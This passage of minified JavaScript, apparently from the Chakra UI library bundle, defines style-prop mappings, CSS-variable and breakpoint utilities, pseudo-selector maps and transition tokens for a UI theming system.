  borderInlineEndWidth: Hg.borderWidths("borderInlineEndWidth"),
  borderRightColor: Hg.colors("borderRightColor"),
  borderInlineEndColor: Hg.colors("borderInlineEndColor"),
  borderRightStyle: Hg.borderStyles("borderRightStyle"),
  borderInlineEndStyle: Hg.borderStyles("borderInlineEndStyle"),
  borderTopRadius: Hg.radii(["borderTopLeftRadius", "borderTopRightRadius"]),
  borderBottomRadius: Hg.radii(["borderBottomLeftRadius", "borderBottomRightRadius"]),
  borderLeftRadius: Hg.radii(["borderTopLeftRadius", "borderBottomLeftRadius"]),
  borderRightRadius: Hg.radii(["borderTopRightRadius", "borderBottomRightRadius"]),
};
Object.assign(Yg, {
  rounded: Yg.borderRadius,
  roundedTop: Yg.borderTopRadius,
  roundedTopLeft: Yg.borderTopLeftRadius,
  roundedTopRight: Yg.borderTopRightRadius,
  roundedTopStart: Yg.borderStartStartRadius,
  roundedTopEnd: Yg.borderStartEndRadius,
  roundedBottom: Yg.borderBottomRadius,
  roundedBottomLeft: Yg.borderBottomLeftRadius,
  roundedBottomRight: Yg.borderBottomRightRadius,
  roundedBottomStart: Yg.borderEndStartRadius,
  roundedBottomEnd: Yg.borderEndEndRadius,
  roundedLeft: Yg.borderLeftRadius,
  roundedRight: Yg.borderRightRadius,
  roundedStart: Yg.borderInlineStartRadius,
  roundedEnd: Yg.borderInlineEndRadius,
  borderStart: Yg.borderInlineStart,
  borderEnd: Yg.borderInlineEnd,
  borderTopStartRadius: Yg.borderStartStartRadius,
  borderTopEndRadius: Yg.borderStartEndRadius,
  borderBottomStartRadius: Yg.borderEndStartRadius,
  borderBottomEndRadius: Yg.borderEndEndRadius,
  borderStartRadius: Yg.borderInlineStartRadius,
  borderEndRadius: Yg.borderInlineEndRadius,
  borderStartWidth: Yg.borderInlineStartWidth,
  borderEndWidth: Yg.borderInlineEndWidth,
  borderStartColor: Yg.borderInlineStartColor,
  borderEndColor: Yg.borderInlineEndColor,
  borderStartStyle: Yg.borderInlineStartStyle,
  borderEndStyle: Yg.borderInlineEndStyle,
});
var Xg = { color: Hg.colors("color"), textColor: Hg.colors("color"), fill: Hg.colors("fill"), stroke: Hg.colors("stroke") },
  Gg = { boxShadow: Hg.shadows("boxShadow"), mixBlendMode: !0, blendMode: Hg.prop("mixBlendMode"), backgroundBlendMode: !0, bgBlendMode: Hg.prop("backgroundBlendMode"), opacity: !0 };
Object.assign(Gg, { shadow: Gg.boxShadow });
var Qg = {
      filter: { transform: Wg.filter },
      blur: Hg.blur("--chakra-blur"),
      brightness: Hg.propT("--chakra-brightness", Wg.brightness),
      contrast: Hg.propT("--chakra-contrast", Wg.contrast),
      hueRotate: Hg.degreeT("--chakra-hue-rotate"),
      invert: Hg.propT("--chakra-invert", Wg.invert),
      saturate: Hg.propT("--chakra-saturate", Wg.saturate),
      dropShadow: Hg.propT("--chakra-drop-shadow", Wg.dropShadow),
      backdropFilter: { transform: Wg.backdropFilter },
      backdropBlur: Hg.blur("--chakra-backdrop-blur"),
      backdropBrightness: Hg.propT("--chakra-backdrop-brightness", Wg.brightness),
      backdropContrast: Hg.propT("--chakra-backdrop-contrast", Wg.contrast),
      backdropHueRotate: Hg.degreeT("--chakra-backdrop-hue-rotate"),
      backdropInvert: Hg.propT("--chakra-backdrop-invert", Wg.invert),
      backdropSaturate: Hg.propT("--chakra-backdrop-saturate", Wg.saturate),
  },
  Kg = {
      alignItems: !0,
      alignContent: !0,
      justifyItems: !0,
      justifyContent: !0,
      flexWrap: !0,
      flexDirection: { transform: Wg.flexDirection },
      flex: !0,
      flexFlow: !0,
      flexGrow: !0,
      flexShrink: !0,
      flexBasis: Hg.sizes("flexBasis"),
      justifySelf: !0,
      alignSelf: !0,
      order: !0,
      placeItems: !0,
      placeContent: !0,
      placeSelf: !0,
      gap: Hg.space("gap"),
      rowGap: Hg.space("rowGap"),
      columnGap: Hg.space("columnGap"),
  };
Object.assign(Kg, { flexDir: Kg.flexDirection });
var Zg = {
      gridGap: Hg.space("gridGap"),
      gridColumnGap: Hg.space("gridColumnGap"),
      gridRowGap: Hg.space("gridRowGap"),
      gridColumn: !0,
      gridRow: !0,
      gridAutoFlow: !0,
      gridAutoColumns: !0,
      gridColumnStart: !0,
      gridColumnEnd: !0,
      gridRowStart: !0,
      gridRowEnd: !0,
      gridAutoRows: !0,
      gridTemplate: !0,
      gridTemplateColumns: !0,
      gridTemplateRows: !0,
      gridTemplateAreas: !0,
      gridArea: !0,
  },
  Jg = { appearance: !0, cursor: !0, resize: !0, userSelect: !0, pointerEvents: !0, outline: { transform: Wg.outline }, outlineOffset: !0, outlineColor: Hg.colors("outlineColor") },
  ev = {
      width: Hg.sizesT("width"),
      inlineSize: Hg.sizesT("inlineSize"),
      height: Hg.sizes("height"),
      blockSize: Hg.sizes("blockSize"),
      boxSize: Hg.sizes(["width", "height"]),
      minWidth: Hg.sizes("minWidth"),
      minInlineSize: Hg.sizes("minInlineSize"),
      minHeight: Hg.sizes("minHeight"),
      minBlockSize: Hg.sizes("minBlockSize"),
      maxWidth: Hg.sizes("maxWidth"),
      maxInlineSize: Hg.sizes("maxInlineSize"),
      maxHeight: Hg.sizes("maxHeight"),
      maxBlockSize: Hg.sizes("maxBlockSize"),
      overflow: !0,
      overflowX: !0,
      overflowY: !0,
      overscrollBehavior: !0,
      overscrollBehaviorX: !0,
      overscrollBehaviorY: !0,
      display: !0,
      aspectRatio: !0,
      hideFrom: {
          scale: "breakpoints",
          transform: (e, t) => {
              var n, r, o;
              return { [`@media screen and (min-width: ${null != (o = null == (r = null == (n = t.__breakpoints) ? void 0 : n.get(e)) ? void 0 : r.minW) ? o : e})`]: { display: "none" } };
          },
      },
      hideBelow: {
          scale: "breakpoints",
          transform: (e, t) => {
              var n, r, o;
              return { [`@media screen and (max-width: ${null != (o = null == (r = null == (n = t.__breakpoints) ? void 0 : n.get(e)) ? void 0 : r._minW) ? o : e})`]: { display: "none" } };
          },
      },
      verticalAlign: !0,
      boxSizing: !0,
      boxDecorationBreak: !0,
      float: Hg.propT("float", Wg.float),
      objectFit: !0,
      objectPosition: !0,
      visibility: !0,
      isolation: !0,
  };
Object.assign(ev, { w: ev.width, h: ev.height, minW: ev.minWidth, maxW: ev.maxWidth, minH: ev.minHeight, maxH: ev.maxHeight, overscroll: ev.overscrollBehavior, overscrollX: ev.overscrollBehaviorX, overscrollY: ev.overscrollBehaviorY });
var tv = { listStyleType: !0, listStylePosition: !0, listStylePos: Hg.prop("listStylePosition"), listStyleImage: !0, listStyleImg: Hg.prop("listStyleImage") };
var nv = ((e) => {
      const t = new WeakMap();
      return (n, r, o, a) => {
          if (void 0 === n) return e(n, r, o);
          t.has(n) || t.set(n, new Map());
          const i = t.get(n);
          if (i.has(r)) return i.get(r);
          const s = e(n, r, o, a);
          return i.set(r, s), s;
      };
  })(function (e, t, n, r) {
      const o = "string" == typeof t ? t.split(".") : [t];
      for (r = 0; r < o.length && e; r += 1) e = e[o[r]];
      return void 0 === e ? n : e;
  }),
  rv = { border: "0px", clip: "rect(0, 0, 0, 0)", width: "1px", height: "1px", margin: "-1px", padding: "0px", overflow: "hidden", whiteSpace: "nowrap", position: "absolute" },
  ov = { position: "static", width: "auto", height: "auto", clip: "auto", padding: "0", margin: "0", overflow: "visible", whiteSpace: "normal" },
  av = (e, t, n) => {
      const r = {},
          o = nv(e, t, {});
      for (const a in o) {
          (a in n && null != n[a]) || (r[a] = o[a]);
      }
      return r;
  },
  iv = {
      srOnly: { transform: (e) => (!0 === e ? rv : "focusable" === e ? ov : {}) },
      layerStyle: { processResult: !0, transform: (e, t, n) => av(t, `layerStyles.${e}`, n) },
      textStyle: { processResult: !0, transform: (e, t, n) => av(t, `textStyles.${e}`, n) },
      apply: { processResult: !0, transform: (e, t, n) => av(t, e, n) },
  },
  sv = {
      position: !0,
      pos: Hg.prop("position"),
      zIndex: Hg.prop("zIndex", "zIndices"),
      inset: Hg.spaceT("inset"),
      insetX: Hg.spaceT(["left", "right"]),
      insetInline: Hg.spaceT("insetInline"),
      insetY: Hg.spaceT(["top", "bottom"]),
      insetBlock: Hg.spaceT("insetBlock"),
      top: Hg.spaceT("top"),
      insetBlockStart: Hg.spaceT("insetBlockStart"),
      bottom: Hg.spaceT("bottom"),
      insetBlockEnd: Hg.spaceT("insetBlockEnd"),
      left: Hg.spaceT("left"),
      insetInlineStart: Hg.logical({ scale: "space", property: { ltr: "left", rtl: "right" } }),
      right: Hg.spaceT("right"),
      insetInlineEnd: Hg.logical({ scale: "space", property: { ltr: "right", rtl: "left" } }),
  };
Object.assign(sv, { insetStart: sv.insetInlineStart, insetEnd: sv.insetInlineEnd });
var lv = { ring: { transform: Wg.ring }, ringColor: Hg.colors("--chakra-ring-color"), ringOffset: Hg.prop("--chakra-ring-offset-width"), ringOffsetColor: Hg.colors("--chakra-ring-offset-color"), ringInset: Hg.prop("--chakra-ring-inset") },
  cv = {
      margin: Hg.spaceT("margin"),
      marginTop: Hg.spaceT("marginTop"),
      marginBlockStart: Hg.spaceT("marginBlockStart"),
      marginRight: Hg.spaceT("marginRight"),
      marginInlineEnd: Hg.spaceT("marginInlineEnd"),
      marginBottom: Hg.spaceT("marginBottom"),
      marginBlockEnd: Hg.spaceT("marginBlockEnd"),
      marginLeft: Hg.spaceT("marginLeft"),
      marginInlineStart: Hg.spaceT("marginInlineStart"),
      marginX: Hg.spaceT(["marginInlineStart", "marginInlineEnd"]),
      marginInline: Hg.spaceT("marginInline"),
      marginY: Hg.spaceT(["marginTop", "marginBottom"]),
      marginBlock: Hg.spaceT("marginBlock"),
      padding: Hg.space("padding"),
      paddingTop: Hg.space("paddingTop"),
      paddingBlockStart: Hg.space("paddingBlockStart"),
      paddingRight: Hg.space("paddingRight"),
      paddingBottom: Hg.space("paddingBottom"),
      paddingBlockEnd: Hg.space("paddingBlockEnd"),
      paddingLeft: Hg.space("paddingLeft"),
      paddingInlineStart: Hg.space("paddingInlineStart"),
      paddingInlineEnd: Hg.space("paddingInlineEnd"),
      paddingX: Hg.space(["paddingInlineStart", "paddingInlineEnd"]),
      paddingInline: Hg.space("paddingInline"),
      paddingY: Hg.space(["paddingTop", "paddingBottom"]),
      paddingBlock: Hg.space("paddingBlock"),
  };
Object.assign(cv, {
  m: cv.margin,
  mt: cv.marginTop,
  mr: cv.marginRight,
  me: cv.marginInlineEnd,
  marginEnd: cv.marginInlineEnd,
  mb: cv.marginBottom,
  ml: cv.marginLeft,
  ms: cv.marginInlineStart,
  marginStart: cv.marginInlineStart,
  mx: cv.marginX,
  my: cv.marginY,
  p: cv.padding,
  pt: cv.paddingTop,
  py: cv.paddingY,
  px: cv.paddingX,
  pb: cv.paddingBottom,
  pl: cv.paddingLeft,
  ps: cv.paddingInlineStart,
  paddingStart: cv.paddingInlineStart,
  pr: cv.paddingRight,
  pe: cv.paddingInlineEnd,
  paddingEnd: cv.paddingInlineEnd,
});
var uv = {
      textDecorationColor: Hg.colors("textDecorationColor"),
      textDecoration: !0,
      textDecor: { property: "textDecoration" },
      textDecorationLine: !0,
      textDecorationStyle: !0,
      textDecorationThickness: !0,
      textUnderlineOffset: !0,
      textShadow: Hg.shadows("textShadow"),
  },
  dv = {
      clipPath: !0,
      transform: Hg.propT("transform", Wg.transform),
      transformOrigin: !0,
      translateX: Hg.spaceT("--chakra-translate-x"),
      translateY: Hg.spaceT("--chakra-translate-y"),
      skewX: Hg.degreeT("--chakra-skew-x"),
      skewY: Hg.degreeT("--chakra-skew-y"),
      scaleX: Hg.prop("--chakra-scale-x"),
      scaleY: Hg.prop("--chakra-scale-y"),
      scale: Hg.prop(["--chakra-scale-x", "--chakra-scale-y"]),
      rotate: Hg.degreeT("--chakra-rotate"),
  },
  fv = {
      transition: !0,
      transitionDelay: !0,
      animation: !0,
      willChange: !0,
      transitionDuration: Hg.prop("transitionDuration", "transition.duration"),
      transitionProperty: Hg.prop("transitionProperty", "transition.property"),
      transitionTimingFunction: Hg.prop("transitionTimingFunction", "transition.easing"),
  },
  pv = {
      fontFamily: Hg.prop("fontFamily", "fonts"),
      fontSize: Hg.prop("fontSize", "fontSizes", Wg.px),
      fontWeight: Hg.prop("fontWeight", "fontWeights"),
      lineHeight: Hg.prop("lineHeight", "lineHeights"),
      letterSpacing: Hg.prop("letterSpacing", "letterSpacings"),
      textAlign: !0,
      fontStyle: !0,
      textIndent: !0,
      wordBreak: !0,
      overflowWrap: !0,
      textOverflow: !0,
      textTransform: !0,
      whiteSpace: !0,
      isTruncated: {
          transform(e) {
              if (!0 === e) return { overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" };
          },
      },
      noOfLines: { static: { overflow: "hidden", textOverflow: "ellipsis", display: "-webkit-box", WebkitBoxOrient: "vertical", WebkitLineClamp: "var(--chakra-line-clamp)" }, property: "--chakra-line-clamp" },
  },
  hv = {
      scrollBehavior: !0,
      scrollSnapAlign: !0,
      scrollSnapStop: !0,
      scrollSnapType: !0,
      scrollMargin: Hg.spaceT("scrollMargin"),
      scrollMarginTop: Hg.spaceT("scrollMarginTop"),
      scrollMarginBottom: Hg.spaceT("scrollMarginBottom"),
      scrollMarginLeft: Hg.spaceT("scrollMarginLeft"),
      scrollMarginRight: Hg.spaceT("scrollMarginRight"),
      scrollMarginX: Hg.spaceT(["scrollMarginLeft", "scrollMarginRight"]),
      scrollMarginY: Hg.spaceT(["scrollMarginTop", "scrollMarginBottom"]),
      scrollPadding: Hg.spaceT("scrollPadding"),
      scrollPaddingTop: Hg.spaceT("scrollPaddingTop"),
      scrollPaddingBottom: Hg.spaceT("scrollPaddingBottom"),
      scrollPaddingLeft: Hg.spaceT("scrollPaddingLeft"),
      scrollPaddingRight: Hg.spaceT("scrollPaddingRight"),
      scrollPaddingX: Hg.spaceT(["scrollPaddingLeft", "scrollPaddingRight"]),
      scrollPaddingY: Hg.spaceT(["scrollPaddingTop", "scrollPaddingBottom"]),
  };
function mv(e) {
  return xg(e) && e.reference ? e.reference : String(e);
}
var gv = (e, ...t) => t.map(mv).join(` ${e} `).replace(/calc/g, ""),
  vv = (...e) => `calc(${gv("+", ...e)})`,
  yv = (...e) => `calc(${gv("-", ...e)})`,
  bv = (...e) => `calc(${gv("*", ...e)})`,
  xv = (...e) => `calc(${gv("/", ...e)})`,
  wv = (e) => {
      const t = mv(e);
      return null == t || Number.isNaN(parseFloat(t)) ? bv(t, -1) : String(t).startsWith("-") ? String(t).slice(1) : `-${t}`;
  },
  Sv = Object.assign((e) => ({ add: (...t) => Sv(vv(e, ...t)), subtract: (...t) => Sv(yv(e, ...t)), multiply: (...t) => Sv(bv(e, ...t)), divide: (...t) => Sv(xv(e, ...t)), negate: () => Sv(wv(e)), toString: () => e.toString() }), {
      add: vv,
      subtract: yv,
      multiply: bv,
      divide: xv,
      negate: wv,
  });
function kv(e) {
  return (function (e) {
      return e.replace(/[!-,/:-@[-^`{-~]/g, "\\$&");
  })(
      (function (e) {
          if (e.includes("\\.")) return e;
          const t = !Number.isInteger(parseFloat(e.toString()));
          return t ? e.replace(".", "\\.") : e;
      })(
          (function (e, t = "-") {
              return e.replace(/\s+/g, t);
          })(e.toString())
      )
  );
}
function Ev(e, t) {
  return `var(${e}${t ? `, ${t}` : ""})`;
}
function Cv(e, t = "") {
  return kv(
      `--${(function (e, t = "") {
          return [t, e].filter(Boolean).join("-");
      })(e, t)}`
  );
}
function _v(e, t, n) {
  const r = Cv(e, n);
  return { variable: r, reference: Ev(r, t) };
}
function Pv(e) {
  const t = null == e ? 0 : e.length;
  return t ? e[t - 1] : void 0;
}
function Tv(e) {
  if (null == e) return e;
  const { unitless: t } = (function (e) {
      const t = parseFloat(e.toString()),
          n = e.toString().replace(String(t), "");
      return { unitless: !n, value: t, unit: n };
  })(e);
  return t || "number" == typeof e ? `${e}px` : e;
}
var Rv = (e, t) => (parseInt(e[1], 10) > parseInt(t[1], 10) ? 1 : -1),
  zv = (e) => Object.fromEntries(Object.entries(e).sort(Rv));
function Av(e) {
  const t = zv(e);
  return Object.assign(Object.values(t), t);
}
function jv(e) {
  var t;
  if (!e) return e;
  e = null != (t = Tv(e)) ? t : e;
  return "number" == typeof e ? `${e + -0.02}` : e.replace(/(\d+\.?\d*)/u, (e) => `${parseFloat(e) + -0.02}`);
}
function Ov(e, t) {
  const n = ["@media screen"];
  return e && n.push("and", `(min-width: ${Tv(e)})`), t && n.push("and", `(max-width: ${Tv(t)})`), n.join(" ");
}
function Fv(e) {
  var t;
  if (!e) return null;
  e.base = null != (t = e.base) ? t : "0px";
  const n = Av(e),
      r = Object.entries(e)
          .sort(Rv)
          .map(([e, t], n, r) => {
              var o;
              let [, a] = null != (o = r[n + 1]) ? o : [];
              return (a = parseFloat(a) > 0 ? jv(a) : void 0), { _minW: jv(t), breakpoint: e, minW: t, maxW: a, maxWQuery: Ov(null, a), minWQuery: Ov(t), minMaxQuery: Ov(t, a) };
          }),
      o = (function (e) {
          const t = Object.keys(zv(e));
          return new Set(t);
      })(e),
      a = Array.from(o.values());
  return {
      keys: o,
      normalized: n,
      isResponsive(e) {
          const t = Object.keys(e);
          return t.length > 0 && t.every((e) => o.has(e));
      },
      asObject: zv(e),
      asArray: Av(e),
      details: r,
      get: (e) => r.find((t) => t.breakpoint === e),
      media: [null, ...n.map((e) => Ov(e)).slice(1)],
      toArrayValue(e) {
          if (!xg(e)) throw new Error("toArrayValue: value must be an object");
          const t = a.map((t) => {
              var n;
              return null != (n = e[t]) ? n : null;
          });
          for (; null === Pv(t); ) t.pop();
          return t;
      },
      toObjectValue(e) {
          if (!Array.isArray(e)) throw new Error("toObjectValue: value must be an array");
          return e.reduce((e, t, n) => {
              const r = a[n];
              return null != r && null != t && (e[r] = t), e;
          }, {});
      },
  };
}
var Nv = (e, t) => `${e}:hover ${t}, ${e}[data-hover] ${t}`,
  Mv = (e, t) => `${e}:focus ${t}, ${e}[data-focus] ${t}`,
  Lv = (e, t) => `${e}:focus-visible ${t}`,
  Bv = (e, t) => `${e}:focus-within ${t}`,
  Iv = (e, t) => `${e}:active ${t}, ${e}[data-active] ${t}`,
  Dv = (e, t) => `${e}:disabled ${t}, ${e}[data-disabled] ${t}`,
  $v = (e, t) => `${e}:invalid ${t}, ${e}[data-invalid] ${t}`,
  Vv = (e, t) => `${e}:checked ${t}, ${e}[data-checked] ${t}`,
  Uv = (e, t) => `${e}:placeholder-shown ${t}`,
  Wv = (e) => qv((t) => e(t, "&"), "[role=group]", "[data-group]", ".group"),
  Hv = (e) => qv((t) => e(t, "~ &"), "[data-peer]", ".peer"),
  qv = (e, ...t) => t.map(e).join(", "),
  Yv = {
      _hover: "&:hover, &[data-hover]",
      _active: "&:active, &[data-active]",
      _focus: "&:focus, &[data-focus]",
      _highlighted: "&[data-highlighted]",
      _focusWithin: "&:focus-within",
      _focusVisible: "&:focus-visible, &[data-focus-visible]",
      _disabled: "&:disabled, &[disabled], &[aria-disabled=true], &[data-disabled]",
      _readOnly: "&[aria-readonly=true], &[readonly], &[data-readonly]",
      _before: "&::before",
      _after: "&::after",
      _empty: "&:empty",
      _expanded: "&[aria-expanded=true], &[data-expanded]",
      _checked: "&[aria-checked=true], &[data-checked]",
      _grabbed: "&[aria-grabbed=true], &[data-grabbed]",
      _pressed: "&[aria-pressed=true], &[data-pressed]",
      _invalid: "&[aria-invalid=true], &[data-invalid]",
      _valid: "&[data-valid], &[data-state=valid]",
      _loading: "&[data-loading], &[aria-busy=true]",
      _selected: "&[aria-selected=true], &[data-selected]",
      _hidden: "&[hidden], &[data-hidden]",
      _autofill: "&:-webkit-autofill",
      _even: "&:nth-of-type(even)",
      _odd: "&:nth-of-type(odd)",
      _first: "&:first-of-type",
      _firstLetter: "&::first-letter",
      _last: "&:last-of-type",
      _notFirst: "&:not(:first-of-type)",
      _notLast: "&:not(:last-of-type)",
      _visited: "&:visited",
      _activeLink: "&[aria-current=page]",
      _activeStep: "&[aria-current=step]",
      _indeterminate: "&:indeterminate, &[aria-checked=mixed], &[data-indeterminate]",
      _groupHover: Wv(Nv),
      _peerHover: Hv(Nv),
      _groupFocus: Wv(Mv),
      _peerFocus: Hv(Mv),
      _groupFocusVisible: Wv(Lv),
      _peerFocusVisible: Hv(Lv),
      _groupActive: Wv(Iv),
      _peerActive: Hv(Iv),
      _groupDisabled: Wv(Dv),
      _peerDisabled: Hv(Dv),
      _groupInvalid: Wv($v),
      _peerInvalid: Hv($v),
      _groupChecked: Wv(Vv),
      _peerChecked: Hv(Vv),
      _groupFocusWithin: Wv(Bv),
      _peerFocusWithin: Hv(Bv),
      _peerPlaceholderShown: Hv(Uv),
      _placeholder: "&::placeholder",
      _placeholderShown: "&:placeholder-shown",
      _fullScreen: "&:fullscreen",
      _selection: "&::selection",
      _rtl: "[dir=rtl] &, &[dir=rtl]",
      _ltr: "[dir=ltr] &, &[dir=ltr]",
      _mediaDark: "@media (prefers-color-scheme: dark)",
      _mediaReduceMotion: "@media (prefers-reduced-motion: reduce)",
      _dark: ".chakra-ui-dark &:not([data-theme]),[data-theme=dark] &:not([data-theme]),&[data-theme=dark]",
      _light: ".chakra-ui-light &:not([data-theme]),[data-theme=light] &:not([data-theme]),&[data-theme=light]",
      _horizontal: "&[data-orientation=horizontal]",
      _vertical: "&[data-orientation=vertical]",
  },
  Xv = Object.keys(Yv);
function Gv(e, t) {
  return _v(String(e).replace(/\./g, "-"), void 0, t);
}
function Qv(e, t, n = {}) {
  const { stop: r, getKey: o } = n;
  return (function e(n, a = []) {
      var i;
      if (
          (function (e) {
              return "object" == typeof e && null != e && !Array.isArray(e);
          })(n) ||
          Array.isArray(n)
      ) {
          const s = {};
          for (const [l, c] of Object.entries(n)) {
              const u = null != (i = null == o ? void 0 : o(l)) ? i : l,
                  d = [...a, u];
              if (null == r ? void 0 : r(n, d)) return t(n, a);
              s[u] = e(c, d);
          }
          return s;
      }
      return t(n, a);
  })(e);
}
var Kv = ["colors", "borders", "borderWidths", "borderStyles", "fonts", "fontSizes", "fontWeights", "gradients", "letterSpacings", "lineHeights", "radii", "space", "shadows", "sizes", "zIndices", "transition", "blur", "breakpoints"];
var Zv = (e) => Xv.includes(e) || "default" === e;
function Jv(e) {
  var t;
  const n = (function (e) {
          const { __cssMap: t, __cssVars: n, __breakpoints: r, ...o } = e;
          return o;
      })(e),
      r = (function (e) {
          return (function (e, t) {
              const n = {};
              for (const r of t) r in e && (n[r] = e[r]);
              return n;
          })(e, Kv);
      })(n),
      o = (function (e) {
          return e.semanticTokens;
      })(n),
      a = (function ({ tokens: e, semanticTokens: t }) {
          const n = {};
          return (
              Qv(e, (e, t) => {
                  null != e && (n[t.join(".")] = { isSemantic: !1, value: e });
              }),
              Qv(
                  t,
                  (e, t) => {
                      null != e && (n[t.join(".")] = { isSemantic: !0, value: e });
                  },
                  { stop: (e) => Object.keys(e).every(Zv) }
              ),
              n
          );
      })({ tokens: r, semanticTokens: o }),
      i = null == (t = n.config) ? void 0 : t.cssVarPrefix,
      { cssMap: s, cssVars: l } = (function (e, t) {
          let n = {};
          const r = {};
          for (const [o, a] of Object.entries(e)) {
              const { isSemantic: i, value: s } = a,
                  { variable: l, reference: c } = Gv(o, null == t ? void 0 : t.cssVarPrefix);
              if (!i) {
                  if (o.startsWith("space")) {
                      const e = o.split("."),
                          [t, ...n] = e,
                          a = `${t}.-${n.join(".")}`,
                          i = Sv.negate(s),
                          u = Sv.negate(c);
                      r[a] = { value: i, var: l, varRef: u };
                  }
                  (n[l] = s), (r[o] = { value: s, var: l, varRef: c });
                  continue;
              }
              const u = (n) => {
                      const r = [String(o).split(".")[0], n].join(".");
                      if (!e[r]) return n;
                      const { reference: a } = Gv(r, null == t ? void 0 : t.cssVarPrefix);
                      return a;
                  },
                  d = xg(s) ? s : { default: s };
              (n = Pg(
                  n,
                  Object.entries(d).reduce((e, [t, n]) => {
                      var r, o;
                      if (!n) return e;
                      const a = u(`${n}`);
                      return "default" === t ? ((e[l] = a), e) : ((e[null != (o = null == (r = Yv) ? void 0 : r[t]) ? o : t] = { [l]: a }), e);
                  }, {})
              )),
                  (r[o] = { value: c, var: l, varRef: c });
          }
          return { cssVars: n, cssMap: r };
      })(a, { cssVarPrefix: i });
  return (
      Object.assign(n, {
          __cssVars: {
              "--chakra-ring-inset": "var(--chakra-empty,/*!*/ /*!*/)",
              "--chakra-ring-offset-width": "0px",
              "--chakra-ring-offset-color": "#fff",
              "--chakra-ring-color": "rgba(66, 153, 225, 0.6)",
              "--chakra-ring-offset-shadow": "0 0 #0000",
              "--chakra-ring-shadow": "0 0 #0000",
              "--chakra-space-x-reverse": "0",
              "--chakra-space-y-reverse": "0",
              ...l,
          },
          __cssMap: s,
          __breakpoints: Fv(n.breakpoints),
      }),
      n
  );
}
var ey = Pg({}, qg, Yg, Xg, Kg, ev, Qg, lv, Jg, Zg, iv, sv, Gg, cv, hv, pv, uv, dv, tv, fv),
  ty = Object.assign({}, cv, ev, Kg, Zg, sv),
  ny = Object.keys(ty),
  ry = [...Object.keys(ey), ...Xv],
  oy = { ...ey, ...Yv };
var ay = (e, t) =>
      e.startsWith("--") &&
      "string" == typeof t &&
      !(function (e) {
          return /^var\(--.+\)$/.test(e);
      })(t),
  iy = (e, t) => {
      var n, r;
      if (null == t) return t;
      const o = (t) => {
              var n, r;
              return null == (r = null == (n = e.__cssMap) ? void 0 : n[t]) ? void 0 : r.varRef;
          },
          a = (e) => {
              var t;
              return null != (t = o(e)) ? t : e;
          },
          [i, s] = (function (e) {
              const t = [];
              let n = "",
                  r = !1;
              for (let o = 0; o < e.length; o++) {
                  const a = e[o];
                  "(" === a ? ((r = !0), (n += a)) : ")" === a ? ((r = !1), (n += a)) : "," !== a || r ? (n += a) : (t.push(n), (n = ""));
              }
              return (n = n.trim()), n && t.push(n), t;
          })(t);
      return (t = null != (r = null != (n = o(i)) ? n : a(s)) ? r : a(t));
  };
function sy(e) {
  const { configs: t = {}, pseudos: n = {}, theme: r } = e,
      o = (e, a = !1) => {
          var i, s, l;
          const c = wg(e, r),
              u = ((e) => (t) => {
                  if (!t.__breakpoints) return e;
                  const { isResponsive: n, toArrayValue: r, media: o } = t.__breakpoints,
                      a = {};
                  for (const i in e) {
                      let s = wg(e[i], t);
                      if (null == s) continue;
                      if (((s = xg(s) && n(s) ? r(s) : s), !Array.isArray(s))) {
                          a[i] = s;
                          continue;
                      }
                      const l = s.slice(0, o.length).length;
                      for (let e = 0; e < l; e += 1) {
                          const t = null == o ? void 0 : o[e];
                          t ? ((a[t] = a[t] || {}), null != s[e] && (a[t][i] = s[e])) : (a[i] = s[e]);
                      }
                  }
                  return a;
              })(c)(r);
          let d = {};
          for (let f in u) {
              let e = wg(u[f], r);
              f in n && (f = n[f]), ay(f, e) && (e = iy(r, e));
              let p = t[f];
              if ((!0 === p && (p = { property: f }), xg(e))) {
                  (d[f] = null != (i = d[f]) ? i : {}), (d[f] = Pg({}, d[f], o(e, !0)));
                  continue;
              }
              let h = null != (l = null == (s = null == p ? void 0 : p.transform) ? void 0 : s.call(p, e, r, c)) ? l : e;
              h = (null == p ? void 0 : p.processResult) ? o(h, !0) : h;
              const m = wg(null == p ? void 0 : p.property, r);
              if (!a && (null == p ? void 0 : p.static)) {
                  const e = wg(p.static, r);
                  d = Pg({}, d, e);
              }
              if (m && Array.isArray(m)) for (const t of m) d[t] = h;
              else m ? ("&" === m && xg(h) ? (d = Pg({}, d, h)) : (d[m] = h)) : xg(h) ? (d = Pg({}, d, h)) : (d[f] = h);
          }
          return d;
      };
  return o;
}
var ly = (e) => (t) => sy({ theme: t, pseudos: Yv, configs: ey })(e);
function cy(e) {
  return { definePartsStyle: (e) => e, defineMultiStyleConfig: (t) => ({ parts: e, ...t }) };
}
function uy(e, t) {
  for (let n = t + 1; n < e.length; n++) if (null != e[n]) return n;
  return -1;
}
function dy(e) {
  const t = e.__breakpoints;
  return function (e, n, r, o) {
      var a, i;
      if (!t) return;
      const s = {},
          l = (function (e, t) {
              return Array.isArray(e) ? e : xg(e) ? t(e) : null != e ? [e] : void 0;
          })(r, t.toArrayValue);
      if (!l) return s;
      const c = l.length,
          u = 1 === c,
          d = !!e.parts;
      for (let f = 0; f < c; f++) {
          const r = t.details[f],
              c = t.details[uy(l, f)],
              p = Ov(r.minW, null == c ? void 0 : c._minW),
              h = wg(null == (a = e[n]) ? void 0 : a[l[f]], o);
          h &&
              (d
                  ? null == (i = e.parts) ||
                    i.forEach((e) => {
                        Pg(s, { [e]: u ? h[e] : { [p]: h[e] } });
                    })
                  : d
                  ? (s[p] = h)
                  : u
                  ? Pg(s, h)
                  : (s[p] = h));
      }
      return s;
  };
}
function fy(e) {
  return (function (e, t = []) {
      const n = Object.assign({}, e);
      for (const r of t) r in n && delete n[r];
      return n;
  })(e, ["styleConfig", "size", "variant", "colorScheme"]);
}
var py = ["borders", "breakpoints", "colors", "components", "config", "direction", "fonts", "fontSizes", "fontWeights", "letterSpacings", "lineHeights", "radii", "shadows", "sizes", "space", "styles", "transition", "zIndices"];
var hy = {
      property: {
          common: "background-color, border-color, color, fill, stroke, opacity, box-shadow, transform",
          colors: "background-color, border-color, color, fill, stroke",
          dimensions: "width, height",
          position: "left, right, top, bottom",
          background: "background-color, background-image, background-position",
      },
      easing: { "ease-in": "cubic-bezier(0.4, 0, 1, 1)", "ease-out": "cubic-bezier(0, 0, 0.2, 1)", "ease-in-out": "cubic-bezier(0.4, 0, 0.2, 1)" },
      duration: { "ultra-fast": "50ms", faster: "100ms", fast: "150ms", normal: "200ms", slow: "300ms", slower: "400ms", "ultra-slow": "500ms" },
  },
